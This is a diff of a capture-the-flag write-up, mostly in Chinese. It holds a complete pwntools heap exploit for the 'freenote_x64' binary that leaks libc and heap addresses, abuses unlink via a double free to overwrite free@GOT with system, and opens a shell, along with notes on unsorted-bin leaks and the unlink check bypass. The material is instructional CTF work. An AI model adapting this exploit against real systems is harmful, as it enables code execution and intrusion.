@@ -1,153 +1,155 @@
 ```python
-    #!/usr/bin/env python
-    from pwn import *
 
-    context(arch = 'x86_64', os = 'linux', endian='little')
-    context.log_level = 'debug'
-    #elf = ELF('./freenote_x64')
-    p = process('./freenote_x64')
-    #p = remote('127.0.0.1',10001)
-    print proc.pidof(p)
-    raw_input('gdb attach')
+#!/usr/bin/env python
+from pwn import *
 
-    def new_note(x):
-        p.recvuntil("Your choice: ")
-        p.send("2\n")
-        p.recvuntil("Length of new note: ")
-        p.send(str(len(x))+"\n")
-        p.recvuntil("Enter your note: ")
-        p.send(x)
+context(arch = 'x86_64', os = 'linux', endian='little')
+context.log_level = 'debug'
+#elf = ELF('./freenote_x64')
+p = process('./freenote_x64')
+#p = remote('127.0.0.1',10001)
+print proc.pidof(p)
+raw_input('gdb attach')
 
-    def delete_note(x):
-        p.recvuntil("Your choice: ")
-        p.send("4\n")
-        p.recvuntil("Note number: ")
-        p.send(str(x)+"\n")
+def new_note(x):
+    p.recvuntil("Your choice: ")
+    p.send("2\n")
+    p.recvuntil("Length of new note: ")
+    p.send(str(len(x))+"\n")
+    p.recvuntil("Enter your note: ")
+    p.send(x)
 
-    def list_note():
-        p.recvuntil("Your choice: ")
-        p.send("1\n")
+def delete_note(x):
+    p.recvuntil("Your choice: ")
+    p.send("4\n")
+    p.recvuntil("Note number: ")
+    p.send(str(x)+"\n")
 
-    def edit_note(x,y):
-        p.recvuntil("Your choice: ")
-        p.send("3\n")   
-        p.recvuntil("Note number: ")
-        p.send(str(x)+"\n")   
-        p.recvuntil("Length of note: ")
-        p.send(str(len(y))+"\n")   
-        p.recvuntil("Enter your note: ")
-        p.send(y)
+def list_note():
+    p.recvuntil("Your choice: ")
+    p.send("1\n")
 
-    ####################leak libc#########################
+def edit_note(x,y):
+    p.recvuntil("Your choice: ")
+    p.send("3\n")   
+    p.recvuntil("Note number: ")
+    p.send(str(x)+"\n")   
+    p.recvuntil("Length of note: ")
+    p.send(str(len(y))+"\n")   
+    p.recvuntil("Enter your note: ")
+    p.send(y)
 
-    if __name__ == '__main__':
-        notelen = 0x80
-        new_note('a' * notelen)
-        new_note('b' * notelen)
-        delete_note(0)
-        new_note('cccccccc')
-        list_note()
-        p.recvuntil('0. ')
-        leak = p.recvuntil('\n')
-        #log.info('heap:' + str(u64(leak[8:-1])))
-        print leak[0:-1].encode('hex')
+####################leak libc#########################
 
-        delete_note(1)
-        delete_note(0)
+if __name__ == '__main__':
+    notelen = 0x80
+    new_note('a' * notelen)
+    new_note('b' * notelen)
+    delete_note(0)
+    new_note('cccccccc')
+    list_note()
+    p.recvuntil('0. ')
+    leak = p.recvuntil('\n')
+    #log.info('heap:' + str(u64(leak[8:-1])))
+    print leak[0:-1].encode('hex')
 
-        #libc_base = leaklibcaddr - offset          (此处偏移依据libc版本不同，基址页对齐4K,也就是地址后三位为000，如：0x7fabba34b000)
-        #进而再算出system, "/bin/sh" 偏移  或者将"/bin/sh\x00" 写入到heap or bss
-        system_sh_addr = leaklibcaddr - 0x3724a8   
-        print "system_sh_addr: " + hex(system_sh_addr)
-        binsh_addr = leaklibcaddr - 0x23e7f1
-        print "binsh_addr: " + hex(binsh_addr)
+    delete_note(1)
+    delete_note(0)
 
-        #raw_input()
+    #libc_base = leaklibcaddr - offset          (此处偏移依据libc版本不同，基址页对齐4K,也就是地址后三位为000，如：0x7fabba34b000)
+    #进而再算出system, "/bin/sh" 偏移  或者将"/bin/sh\x00" 写入到heap or bss
+    system_sh_addr = leaklibcaddr - 0x3724a8   
+    print "system_sh_addr: " + hex(system_sh_addr)
+    binsh_addr = leaklibcaddr - 0x23e7f1
+    print "binsh_addr: " + hex(binsh_addr)
 
-        ####################leak heap#########################
+    #raw_input()
 
-        notelen=0x10
+    ####################leak heap#########################
 
-        new_note("A"*notelen)
-        new_note("B"*notelen)
-        new_note("C"*notelen)
-        new_note("D"*notelen)
-        delete_note(2)
-        delete_note(0)
+    notelen=0x10
 
-        new_note("AAAAAAAA")
-        list_note()
-        p.recvuntil("0. AAAAAAAA")
-        leak = p.recvuntil("\n")
+    new_note("A"*notelen)
+    new_note("B"*notelen)
+    new_note("C"*notelen)
+    new_note("D"*notelen)
+    delete_note(2)
+    delete_note(0)
 
-        print leak[0:-1].encode('hex')
-        leakheapaddr = u64(leak[0:-1].ljust(8, '\x00'))
-        print hex(leakheapaddr)
+    new_note("AAAAAAAA")
+    list_note()
+    p.recvuntil("0. AAAAAAAA")
+    leak = p.recvuntil("\n")
 
-        delete_note(0)
-        delete_note(1)
-        delete_note(3)
+    print leak[0:-1].encode('hex')
+    leakheapaddr = u64(leak[0:-1].ljust(8, '\x00'))
+    print hex(leakheapaddr)
 
-        ####################unlink exp#########################
+    delete_note(0)
+    delete_note(1)
+    delete_note(3)
 
-        notelen = 0x80
+    ####################unlink exp#########################
 
-        #new_note("/bin/sh\x00"+"A"*(notelen-8))
-        new_note("A"*notelen)
-        new_note("B"*notelen)
-        new_note("C"*notelen)
+    notelen = 0x80
 
-        delete_note(2)
-        delete_note(1)
-        delete_note(0)
+    #new_note("/bin/sh\x00"+"A"*(notelen-8))
+    new_note("A"*notelen)
+    new_note("B"*notelen)
+    new_note("C"*notelen)
 
-        fd = leakheapaddr - 0x1808 #notetable
-        bk = fd + 0x8
+    delete_note(2)
+    delete_note(1)
+    delete_note(0)
+
+    fd = leakheapaddr - 0x1808 #notetable
+    bk = fd + 0x8
 
 
-        payload  = ""
-        payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + "A" * (notelen - 0x20)
-        payload += p64(notelen) + p64(notelen+0x10) + "A" * notelen
-        payload += p64(0) + p64(notelen+0x11)+ "\x00" * (notelen-0x20)
+    payload  = ""
+    payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + "A" * (notelen - 0x20)
+    payload += p64(notelen) + p64(notelen+0x10) + "A" * notelen
+    payload += p64(0) + p64(notelen+0x11)+ "\x00" * (notelen-0x20)
 
-        new_note(payload)
+    new_note(payload)
 
-        delete_note(1)
+    delete_note(1)
 
-        free_got = 0x602018
+    free_got = 0x602018
 
-        payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh_addr)
-        payload2 += "A"* (notelen*3-len(payload2)) 
+    payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh_addr)
+    payload2 += "A"* (notelen*3-len(payload2)) 
 
-        edit_note(0, payload2)
-        edit_note(0, p64(system_sh_addr))
+    edit_note(0, payload2)
+    edit_note(0, p64(system_sh_addr))
 
-        delete_note(1)
+    delete_note(1)
 
-        p.interactive()
+    p.interactive()
+        
 ```
 
-泄露libc基址的方法:
-运行脚本程序  python -m pdb myexp.py   (过程中会打印出进程号xxx)
+###### 泄露libc基址的方法:
+- 运行脚本程序  python -m pdb myexp.py   (过程中会打印出进程号xxx)
+- gdb attach  xxx
+    - vmmap 查看内存分布
+    - p main_arena
+    - p main_arena.bins[0]
+    - p &main_arena.bins[0]
+- 通过泄露unsort_bin 地址，我们来计算libc函数基址以及system 函数地址
 
-gdb attach  xxx
-vmmap 查看内存分布
-p main_arena
-p main_arena.bins[0]
-p &main_arena.bins[0]
+#####leaking a heap address is fairly simple though:
+1. Allocate 4 chunks.
+2. Free chunk 3 and chunk 1 (in that order, so that malloc writes the two pointers into chunk 1).
+3. Allocate another chunk of size 1 (or 8). This chunk will be placed where chunk 1 used to be and 
+   where its FD and BK pointers still are, with the BK pointer pointing to chunk 3.
+4. Print the notes, since this is a %s print, we can leak the FD (or BK if chosen size in step 3 was 8)
+   pointer of chunk 1 which in our case points to chunk 3 (heap memory).
+   
+> This same technique can be used to leak a libc address (the head of the freelist is in the .bss of the libc). Simply follow the same steps, but now it suffices to allocate chunks 1 and 2 and free the first. 
 
-通过泄露unsort_bin 地址，我们来计算libc函数基址以及system 函数地址
 
-leaking a heap address is fairly simple though:
-1.Allocate 4 chunks.
-2.Free chunk 3 and chunk 1 (in that order, so that malloc writes the two pointers into chunk 1).
-3.Allocate another chunk of size 1 (or 8). This chunk will be placed where chunk 1 used to be and 
-  where its FD and BK pointers still are, with the BK pointer pointing to chunk 3.
-4.Print the notes, since this is a %s print, we can leak the FD (or BK if chosen size in step 3 was 8)
-  pointer of chunk 1 which in our case points to chunk 3 (heap memory)!
-This same technique can be used to leak a libc address (the head of the freelist is in the .bss of the libc). 
-Simply follow the same steps, but now it suffices to allocate chunks 1 and 2 and free the first.
-
+######对漏洞利用步骤：
 我们通过新建两个note,然后free(0),再new_note("aaaaaaaa"),在new_note时unsorted_bin 双向链表中只有free的note0,当再次申请堆内存时，就会重新获取
 trunk0, "aaaaaaaa"就会覆盖trunk0的fd，list_note()就会泄露trunk0的bk，而bk指向的是main_arena中的unsort_bin 首地址(就是p &main_arena.bins[0]
 地址减去0x10)， 可以算出libc_base的地址，从而确定libc中函数的地址。 
@@ -155,25 +157,25 @@ trunk0, "aaaaaaaa"就会覆盖trunk0的fd，list_note()就会泄露trunk0的bk�
    unsorted_bin的trunk的fd，fd就是unsorted_bin的首地址，从而可以算出libc_base. 如果泄露bk，bk就是第二个插入到unsorted_bin的首地址，利用此方法
    可以泄露出heap的地址，进而计算出heap_base
 2. 如何我们要unlink的trunk的首地址指针为P，那么我们需要找到一个指针X(满足条件*X = P), 我们需要在note table(形式结构体如下：)
-  Struct note{
+ ```c
+ Struct note{
     int flag;
     int length;
     char* content;
   }note;
  fd = X - 0x18
  bk = X - 0x10
-以64bit为例,假设找到了一个已知地址的ptr是指向p(p指向堆上的某个地方)的，通过堆溢出，我们可以做如下的修改。
+```
 
-#!c
+以64bit为例,假设找到了一个已知地址的ptr是指向p(p指向堆上的某个地方)的，通过堆溢出，我们可以做如下的修改。
 p->fd=ptr-0x18
 p->bk=ptr-0x10
-布置好如此结构后，再触发unlink宏，会发生如下情况。
-#!c
-1.FD=p->fd(实际是ptr-0x18)
-2.BK=p->bk(实际是ptr-0x10)
-3.检查是否满足上文所示的限制，由于FD->bk和BK->fd均为*ptr(即p)，由此可以过掉这个限制
-4.FD->bk=BK
-5.BK->fd=FD(p=ptr-0x18)
+布置好如此结构后，再触发unlink宏，会发生如下情况:
+1. FD=p->fd(实际是ptr-0x18)
+2. BK=p->bk(实际是ptr-0x10)
+3. 检查是否满足上文所示的限制，由于FD->bk和BK->fd均为*ptr(即p)，由此可以过掉这个限制
+4. FD->bk=BK
+5. BK->fd=FD(p=ptr-0x18)
   
  执行unlink后, P -> X - 0x18 （P的值变成X - 0x18） X指向的地址做任意写操作,就能通过再次覆盖修改X的值,继而使X指向我们想修改的任意空间,
 从而实现对任意地址的任意修改.
@@ -198,7 +200,6 @@ realloc的行为方式，结合源码总结为：
 4. 如果size为0，效果等同于free()；
 5. 传递给realloc的指针可以为空，等同于malloc；
 6. 传递给realloc的指针必须是先前通过malloc(), calloc(), 或realloc()分配的。
-
 
 通过泄露的libc地址我们可以计算出 system() 函数和 "/bin/sh" 字符串在内存中的地址，通过泄露的堆的地址我们能得到note table的地址。
 然后我们构造一个假的note，利用使用double free的漏洞触发unlink，将note0的位置指向note table的地址。随后我们就可以通过编辑note0
